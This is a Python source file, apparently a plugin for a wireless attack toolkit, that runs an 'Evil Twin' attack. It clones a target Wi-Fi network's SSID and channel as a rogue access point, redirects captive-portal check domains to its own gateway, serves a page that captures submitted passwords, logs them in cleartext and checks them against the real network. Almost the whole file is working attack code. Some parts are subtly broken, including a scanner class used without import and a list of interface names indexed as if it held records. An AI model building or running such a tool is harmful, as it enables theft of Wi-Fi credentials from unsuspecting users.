# src/plugins/evil_twin/main.py
"""
Evil Twin Plugin: Orchestrates a rogue Access Point attack to capture Wi-Fi credentials.
"""

import time
import os
import ipaddress
import threading
from typing import Dict, Any, Optional, List, Callable, Tuple, Union, cast # <--- CRITICAL FIX: Import 'cast' and Union

from core.logger import logger
from core.state_management.context import CapGateContext
from core.state_management.state import AppState
from db.schemas.interface import Interface
from core.interface_controller import InterfaceController
from core.ap_manager import APManager
from core.dhcp_dns_manager import DhcpDnsManager
from core.traffic_redirector import TrafficRedirector
from core.web_server_manager import WebServerManager
from core.credential_verifier import CredentialVerifier

from paths import CAPGATE_CREDENTIALS_FILE
from helpers import shelltools # Needed for ip addr flush etc in cleanup


class EvilTwinAttack:
    """
    Manages the lifecycle of an Evil Twin attack.
    """
    def __init__(self, app_context: CapGateContext):
        self.app_context = app_context
        self.app_state: AppState = app_context.state
        self.logger = logger

        # Initialize managers
        self.interface_controller = InterfaceController(self.app_state)
        self.ap_manager = APManager(self.app_state)
        self.dhcp_dns_manager = DhcpDnsManager()
        self.traffic_redirector = TrafficRedirector()
        self.web_server_manager = WebServerManager()
        self.credential_verifier = CredentialVerifier()

        # Attack-specific state variables (stored in runtime_meta or class instance)
        self.ap_interface_name: Optional[str] = None
        self.deauth_interface_name: Optional[str] = None
        self.verify_interface_name: Optional[str] = None
        self.internet_interface_name: Optional[str] = None

        # Configuration parameters (can be overridden by CLI args)
        self.target_ssid: Optional[str] = self.app_context.get("target_ssid")
        self.target_bssid: Optional[str] = self.app_context.get("target_bssid")
        self.target_channel: Optional[int] = self.app_context.get("target_channel")

        # Set default IP for Evil Twin gateway (can be made configurable)
        self.evil_twin_ip: str = "10.0.0.1" 
        self.dhcp_range_start: str = "10.0.0.10"
        self.dhcp_range_end: str = "10.0.0.250"
        self.dhcp_lease_time: str = "12h"
        self.upstream_dns: str = "8.8.8.8" # Google DNS (fallback)

        self.credentials_captured_event = threading.Event()
        self.captured_creds: Dict[str, Any] = {}

    def _select_interfaces(self) -> bool:
        """
        Selects and configures interfaces for the Evil Twin attack roles (AP, Deauth, Verification).
        Prioritizes user-provided CLI args, then auto-selects based on capabilities.
        """
        self.logger.info("[EvilTwin] Selecting interfaces for AP, Deauth, and Verification roles...")

        all_active_wireless_ifaces: List[Dict[str, Any]] = [
            iface_data for iface_name, iface_data in self.app_state.get_discovery_graph().get("interfaces", {}).items()
            if iface_data.get('is_wireless', False) and iface_data.get('is_up', False)
        ]
        all_active_wireless_ifaces.sort(key=lambda x: x['name']) # Sort for consistent auto-selection


        if not all_active_wireless_ifaces:
            self.logger.error("[EvilTwin] No active wireless interfaces found in AppState. Cannot proceed.")
            return False

        def _get_iface_by_name(name: Optional[str], capability_key: str, purpose: str) -> Optional[Dict[str, Any]]:
            if name:
                iface_data = self.app_state.get_discovery_graph().get("interfaces", {}).get(name)
                if iface_data and iface_data.get('is_wireless', False) and iface_data.get(capability_key, False):
                    self.logger.info(f"[EvilTwin] Using specified {purpose} Interface: {name}")
                    return iface_data
                self.logger.warning(f"[EvilTwin] Specified {purpose} interface '{name}' not found, not wireless, or lacks {capability_key} capability. Attempting auto-selection.")
            return None

        def _auto_select_iface(candidates: List[Dict[str, Any]], purpose: str, exclude_names: List[str] = []) -> Optional[Dict[str, Any]]:
            for iface_data in candidates:
                if iface_data['name'] not in exclude_names:
                    self.logger.info(f"[EvilTwin] Auto-selected {purpose} Interface: {iface_data['name']}")
                    return iface_data
            self.logger.warning(f"[EvilTwin] No unique interface found for {purpose} after excluding {exclude_names}. Reusing if necessary or failing.")
            return None

        auto_select_cli = self.app_context.get("auto_select", False)
        selected_iface_data_map: Dict[str, Optional[Dict[str, Any]]] = {} # Map role to selected interface data
        excluded_iface_names: List[str] = []

        # 1. Select AP interface
        ap_iface_cli = self.app_context.get("ap_iface")
        selected_iface_data_map['ap'] = _get_iface_by_name(ap_iface_cli, 'supports_ap', 'AP')
        if not selected_iface_data_map['ap'] and auto_select_cli:
            selected_iface_data_map['ap'] = _auto_select_iface(
                [i for i in all_active_wireless_ifaces if i.get('supports_ap', False)], 
                'AP', excluded_iface_names
            )
        if not selected_iface_data_map['ap']:
            self.logger.error("[EvilTwin] No suitable AP interface found/selected. Cannot proceed.")
            return False
        self.ap_interface_name = selected_iface_data_map['ap']['name']
        excluded_iface_names.append(self.ap_interface_name)

        # 2. Select Deauth interface
        deauth_iface_cli = self.app_context.get("deauth_iface")
        selected_iface_data_map['deauth'] = _get_iface_by_name(deauth_iface_cli, 'supports_monitor', 'Deauth')
        if not selected_iface_data_map['deauth'] and auto_select_cli:
            selected_iface_data_map['deauth'] = _auto_select_iface(
                [i for i in all_active_wireless_ifaces if i.get('supports_monitor', False)], 
                'Deauth', excluded_iface_names
            )
        if not selected_iface_data_map['deauth'] and selected_iface_data_map['ap'].get('supports_monitor', False):
            selected_iface_data_map['deauth'] = selected_iface_data_map['ap']
            self.logger.warning(f"[EvilTwin] Re-using AP interface {self.ap_interface_name} for Deauth. This is less stable.")
        
        if not selected_iface_data_map['deauth']:
            self.logger.error("[EvilTwin] No suitable Deauth interface found/selected. Cannot proceed.")
            return False
        self.deauth_interface_name = selected_iface_data_map['deauth']['name']
        excluded_iface_names.append(self.deauth_interface_name)


        # 3. Select Verify interface
        verify_iface_cli = self.app_context.get("verify_iface")
        selected_iface_data_map['verify'] = _get_iface_by_name(verify_iface_cli, 'supports_managed', 'Verify')
        if not selected_iface_data_map['verify'] and auto_select_cli:
            selected_iface_data_map['verify'] = _auto_select_iface(
                [i for i in all_active_wireless_ifaces if i.get('supports_managed', False)], 
                'Verify', excluded_iface_names
            )
        if not selected_iface_data_map['verify']:
            managed_candidates = [i for i in all_active_wireless_ifaces if i.get('supports_managed', False)]
            if managed_candidates:
                selected_iface_data_map['verify'] = managed_candidates[0]
                self.logger.warning(f"[EvilTwin] No unique verification interface found. Re-using {selected_iface_data_map['verify']['name']}.")
            else:
                self.logger.error("[EvilTwin] No suitable verification interface found/selected. Verification step will be skipped.")
        
        if selected_iface_data_map['verify']:
            self.verify_interface_name = selected_iface_data_map['verify']['name']

        self.logger.info(f"[EvilTwin] Final Interface Assignments: AP={self.ap_interface_name}, Deauth={self.deauth_interface_name}, Verify={self.verify_interface_name}")


        # 4. Select Internet-facing interface (Optional, wired or wireless)
        internet_iface_cli = self.app_context.get("internet_iface")
        if internet_iface_cli:
            iface_data = self.app_state.get_discovery_graph().get("interfaces", {}).get(internet_iface_cli)
            # Check if it's up and has an IP address
            if iface_data and iface_data.get('is_up', False) and iface_data.get('ip_address'):
                self.internet_interface_name = internet_iface_cli
                self.logger.info(f"[EvilTwin] Using specified Internet Interface: {self.internet_interface_name}")
            else:
                self.logger.warning(f"[EvilTwin] Specified Internet interface '{internet_iface_cli}' not found, not up, or no IP. Attempting auto-selection.")
        
        if not self.internet_interface_name and auto_select_cli:
            # Look for active wired interfaces first
            wired_ifaces = [
                iface for iface_name, iface_data in self.app_state.get_discovery_graph().get("interfaces", {}).items()
                if not iface_data.get('is_wireless', True) and iface_data.get('is_up', False) and iface_data.get('ip_address')
            ]
            if wired_ifaces:
                self.internet_interface_name = wired_ifaces[0]['name']
                self.logger.info(f"[EvilTwin] Auto-selected Internet Interface: {self.internet_interface_name}")
            else:
                self.logger.warning("[EvilTwin] No active wired interface found for internet access. Clients may not get internet redirected.")


        # 5. Assign IP address to AP interface
        self.logger.info(f"[EvilTwin] Assigning IP {self.evil_twin_ip}/24 to {self.ap_interface_name}...")
        try:
            shelltools.run_command(["ip", "link", "set", self.ap_interface_name, "down"], require_root=True, check=False)
            shelltools.run_command(["ip", "addr", "flush", "dev", self.ap_interface_name], require_root=True, check=False)
            shelltools.run_command(["ip", "addr", "add", f"{self.evil_twin_ip}/24", "dev", self.ap_interface_name], require_root=True)
            shelltools.run_command(["ip", "link", "set", self.ap_interface_name, "up"], require_root=True)
            self.logger.info(f"[EvilTwin] IP assigned to {self.ap_interface_name}.")
            
            # Update AppState with the new IP for the AP interface
            iface_data = self.app_state.get_discovery_graph().get("interfaces", {}).get(self.ap_interface_name)
            if iface_data:
                updated_iface = Interface(**iface_data)
                updated_iface.ip_address = f"{self.evil_twin_ip}/24" # Update with its new IP
                self.app_state.update_interfaces({self.ap_interface_name: updated_iface.to_dict()})
                self.logger.debug(f"[EvilTwin] AppState updated with IP for {self.ap_interface_name}.")

        except Exception as e:
            self.logger.error(f"[EvilTwin] Failed to assign IP to {self.ap_interface_name}: {e}")
            return False

        return True

    def _find_target_ap(self) -> bool:
        """
        Uses NetworkScanner to scan for target APs and selects one.
        Updates self.target_ssid, self.target_bssid, self.target_channel.
        """
        self.logger.info("[EvilTwin] Scanning for target APs...")
        
        if not self.deauth_interface_name:
            self.logger.error("[EvilTwin] No deauth interface selected. Cannot scan for APs.")
            return False

        current_deauth_iface_data = self.app_state.get_discovery_graph().get("interfaces", {}).get(self.deauth_interface_name)
        current_deauth_iface_mode = current_deauth_iface_data.get('mode') if current_deauth_iface_data else None

        nm_unmanaged_deauth = False
        if current_deauth_iface_mode != 'monitor':
            self.logger.info(f"[EvilTwin] Putting deauth interface {self.deauth_interface_name} into monitor mode...")
            monitor_iface_name, nm_was_set_unmanaged = self.interface_controller.enable_monitor_mode(self.deauth_interface_name)
            if not monitor_iface_name:
                self.logger.error(f"[EvilTwin] Failed to put {self.deauth_interface_name} into monitor mode for scanning.")
                return False
            self.deauth_interface_name = monitor_iface_name
            nm_unmanaged_deauth = nm_was_set_unmanaged
            self.app_context.set("deauth_iface_nm_unmanaged", nm_unmanaged_deauth)

        network_scanner = NetworkScanner()
        scan_duration = self.app_context.get("scan_duration_seconds", 15)
        security_filter = self.app_context.get("network_security_filter", "WPA")
        
        target_bssid_cli_arg = self.app_context.get("target_bssid")
        target_ssid_cli_arg = self.app_context.get("target_ssid")
        target_channel_cli_arg = self.app_context.get("target_channel")

        networks = network_scanner.perform_airodump_scan(self.deauth_interface_name, scan_duration, security_filter)

        if not networks:
            self.logger.error("[EvilTwin] No networks found during scan. Cannot select target AP.")
            return False

        selected_network: Optional[Dict[str, str]] = None

        if target_bssid_cli_arg or target_ssid_cli_arg:
            for net in networks:
                bssid_match = (target_bssid_cli_arg is None) or (net['bssid'].lower() == target_bssid_cli_arg.lower())
                ssid_match = (target_ssid_cli_arg is None) or (net['essid_raw'].lower() == target_ssid_cli_arg.lower())
                channel_match = (target_channel_cli_arg is None) or (int(net['channel']) == target_channel_cli_arg)
                
                if bssid_match and ssid_match and channel_match:
                    selected_network = net
                    self.logger.info(f"[EvilTwin] CLI specified target AP found: '{selected_network['essid']}' ({selected_network['bssid']})")
                    break
            if not selected_network:
                self.logger.warning("[EvilTwin] CLI specified target AP not found in scan results. Falling back to auto-selection.")

        if not selected_network:
            if self.app_context.get("auto_select", False) or len(networks) == 1:
                selected_network = networks[0]
                self.logger.info(f"[EvilTwin] Auto-selected target AP: '{selected_network['essid']}' ({selected_network['bssid']}) [Ch: {selected_network['channel']}, Pwr: {selected_network['power']}]")
            else:
                self.logger.info("\nDetected networks (sorted by signal strength):")
                for idx, net in enumerate(networks):
                    self.logger.info(f"  {idx+1}. {net['essid']} ({net['bssid']}) [Ch: {net['channel']}, Pwr: {net['power']}, Sec: {net['privacy']}]")
                try:
                    choice_str = input(f"Select target network number [1-{len(networks)}]: ").strip()
                    if not choice_str: choice_str = "1"
                    choice_idx = int(choice_str) - 1
                    if 0 <= choice_idx < len(networks):
                        selected_network = networks[choice_idx]
                    else:
                        self.logger.error("[EvilTwin] Invalid selection index for target AP.")
                        return False
                except (ValueError, EOFError) as e:
                    self.logger.error(f"[EvilTwin] Invalid input for target AP selection: {e}")
                    return False
        
        if not selected_network:
            self.logger.error("[EvilTwin] No target AP selected. Cannot proceed.")
            return False

        self.target_ssid = selected_network['essid_raw']
        self.target_bssid = selected_network['bssid']
        self.target_channel = int(selected_network['channel'])

        self.logger.info(f"[EvilTwin] Final Target AP: '{selected_network['essid']}' ({self.target_bssid}) on channel {self.target_channel}")
        return True

    def _setup_infrastructure(self) -> bool:
        """
        Sets up the rogue AP, DHCP/DNS, and traffic redirection.
        """
        self.logger.info("[EvilTwin] Setting up rogue AP infrastructure...")

        hw_mode = 'g' if self.target_channel and self.target_channel <= 14 else 'a'
        
        if not self.ap_manager.start_ap(
            self.ap_interface_name, 
            self.target_ssid, 
            self.target_channel, 
            hw_mode
        ):
            self.logger.error("[EvilTwin] Failed to start rogue AP.")
            return False
        
        dns_entries = {
            "#": self.evil_twin_ip,
            "www.google.com": self.evil_twin_ip,
            "clients1.google.com": self.evil_twin_ip,
            "www.msftncsi.com": self.evil_twin_ip,
            "www.apple.com": self.evil_twin_ip,
            "detectportal.firefox.com": self.evil_twin_ip,
            "connectivitycheck.gstatic.com": self.evil_twin_ip,
            "connectivitycheck.platform.hicloud.com": self.evil_twin_ip,
            "captiveportal.apple.com": self.evil_twin_ip
        }
        if not self.dhcp_dns_manager.start_dhcp_dns(
            self.ap_interface_name,
            self.dhcp_range_start, self.dhcp_range_end, self.dhcp_lease_time,
            self.evil_twin_ip,
            dns_entries=dns_entries
        ):
            self.logger.error("[EvilTwin] Failed to start DHCP/DNS.")
            return False

        if not self.traffic_redirector.enable_ip_forwarding():
            self.logger.error("[EvilTwin] Failed to enable IP forwarding.")
            return False

        if not self.internet_interface_name:
            self.logger.warning("[EvilTwin] No internet-facing interface detected. Traffic redirection rules may be incomplete (no NAT).")
        
        if not self.traffic_redirector.setup_redirection_rules(
            self.ap_interface_name,
            self.internet_interface_name if self.internet_interface_name else self.ap_interface_name,
            self.evil_twin_ip,
            webserver_port=80
        ):
            self.logger.error("[EvilTwin] Failed to setup traffic redirection rules.")
            return False

        if not self.web_server_manager.start_webserver(
            listen_ip=self.evil_twin_ip,
            listen_port=80,
            credentials_capture_callback=self._on_credentials_captured
        ):
            self.logger.error("[EvilTwin] Failed to start web server.")
            return False

        self.logger.info("[EvilTwin] Rogue AP infrastructure setup complete.")
        return True

    def _on_credentials_captured(self, credentials: Dict[str, Any]):
        """Callback function when credentials are captured by the web server."""
        self.logger.info(f"[EvilTwin] CREDENTIALS CAPTURED: User='{credentials.get('username')}', Password='{credentials.get('password')}'")
        self.captured_creds = credentials
        self.credentials_captured_event.set()

    def _run_attack_loop(self) -> bool:
        """
        Main attack loop: Deauthenticates clients and waits for credentials.
        """
        self.logger.info("[EvilTwin] Starting attack loop: Deauthing clients and waiting for credentials...")
        
        if self.deauth_interface_name:
            self.logger.warning("[EvilTwin] Continuous deauthentication is NOT yet implemented. Manual deauth or a background deauth process is required for persistent attacks.")
        else:
            self.logger.warning("[EvilTwin] No deauth interface available. Deauthentication skipped.")

        self.logger.info("[EvilTwin] Waiting for clients to connect and submit credentials...")
        
        timeout_attack = self.app_context.get("evil_twin_timeout", 300)
        if self.credentials_captured_event.wait(timeout=timeout_attack):
            self.logger.info("[EvilTwin] Credentials captured! Proceeding to verification.")
            return True
        else:
            self.logger.warning("[EvilTwin] Attack timed out. No credentials captured.")
            return False

    def _verify_and_cleanup(self, attack_success: bool) -> bool:
        """
        Verifies captured credentials (if any) and performs final cleanup specific to Evil Twin.
        """
        self.logger.info("[EvilTwin] Starting verification and cleanup phase...")
        
        verification_successful = False
        if attack_success and self.captured_creds.get('username') and self.captured_creds.get('password'):
            self.logger.info("[EvilTwin] Attempting to verify captured credentials...")
            if self.verify_interface_name:
                verification_successful = self.credential_verifier.verify_password(
                    self.verify_interface_name,
                    self.target_ssid,
                    self.captured_creds['password'],
                    self.target_bssid
                )
                if verification_successful:
                    self.logger.info("[EvilTwin] CREDENTIALS VERIFIED! Password is VALID.")
                else:
                    self.logger.warning("[EvilTwin] Captured password FAILED verification.")
            else:
                self.logger.warning("[EvilTwin] No verification interface available. Skipping password verification.")
        elif attack_success:
            self.logger.info("[EvilTwin] Attack succeeded (e.g., captured data), but no specific credentials to verify.")
        else:
            self.logger.info("[EvilTwin] Attack did not succeed (e.g., timed out), skipping verification.")

        if verification_successful:
            self.logger.info("[EvilTwin] Deauthing clients from Evil Twin to reconnect to real AP...")
            self.logger.warning("[EvilTwin] Deauthentication from Evil Twin is NOT yet implemented.")

        return verification_successful

    def cleanup(self):
        """
        Performs comprehensive cleanup of all attack infrastructure.
        """
        self.logger.info("[EvilTwin] Performing comprehensive cleanup...")
        
        self.web_server_manager.stop_webserver()
        self.dhcp_dns_manager.stop_dhcp_dns()
        self.traffic_redirector.clear_redirection_rules()
        self.ap_manager.stop_ap()
        
        if self.deauth_interface_name:
            self.logger.info(f"[EvilTwin] Restoring {self.deauth_interface_name} mode...")
            nm_was_set_unmanaged = self.app_context.get("deauth_iface_nm_unmanaged", False)
            self.interface_controller.restore_interface_state(
                self.deauth_interface_name,
                nm_was_set_unmanaged,
                self.deauth_interface_name
            )
        
        if self.ap_interface_name:
            self.logger.info(f"[EvilTwin] Restoring {self.ap_interface_name} state...")
            try:
                shelltools.run_command(["ip", "addr", "flush", "dev", self.ap_interface_name], require_root=True, check=False)
                shelltools.run_command(["ip", "link", "set", self.ap_interface_name, "down"], require_root=True, check=False)
                shelltools.run_command(["ip", "link", "set", self.ap_interface_name, "up"], require_root=True, check=False)
                shelltools.run_command(["nmcli", "dev", "set", self.ap_interface_name, "managed", "yes"], require_root=True, check=False)
                self.logger.info(f"[EvilTwin] AP interface {self.ap_interface_name} reset and returned to NetworkManager.")
            except Exception as e:
                self.logger.warning(f"[EvilTwin] Failed to fully reset AP interface {self.ap_interface_name}: {e}")

        self.logger.info("[EvilTwin] Comprehensive cleanup finished.")

# --- MAIN ENTRY POINT FOR PLUGIN ---
def run(app_context: CapGateContext, *plugin_args: str):
    attack_succeeded: bool = False
    evil_twin_attack: Optional[EvilTwinAttack] = None

    try:
        logger.info("[PLUGIN EvilTwin] Starting Evil Twin attack orchestration...")

        evil_twin_attack = EvilTwinAttack(app_context)
        
        if not evil_twin_attack._select_interfaces():
            logger.error("[PLUGIN EvilTwin] Halted: Interface selection and setup failed.")
            return False

        if not evil_twin_attack._find_target_ap():
            logger.error("[PLUGIN EvilTwin] Halted: Target AP selection failed.")
            return False
        
        if not evil_twin_attack._setup_infrastructure():
            logger.error("[PLUGIN EvilTwin] Halted: Infrastructure setup failed.")
            return False

        attack_success = evil_twin_attack._run_attack_loop()
        
        attack_succeeded = evil_twin_attack._verify_and_cleanup(attack_success)
        
        if attack_succeeded:
            logger.info("[PLUGIN EvilTwin] Attack completed successfully!")
            logger.info(f"[PLUGIN EvilTwin] Captured Password: {evil_twin_attack.captured_creds.get('password', 'N/A')}")
        else:
            logger.warning("[PLUGIN EvilTwin] Attack finished without full success.")

    except Exception as e:
        from core.debug_tools import print_exception
        print_exception(e, "[PLUGIN EvilTwin] An unexpected error occurred during attack execution")
        logger.error(f"[PLUGIN EvilTwin] Attack failed due to an unexpected error: {e}")
        return False
    finally:
        if evil_twin_attack:
            evil_twin_attack.cleanup()

    return attack_succeeded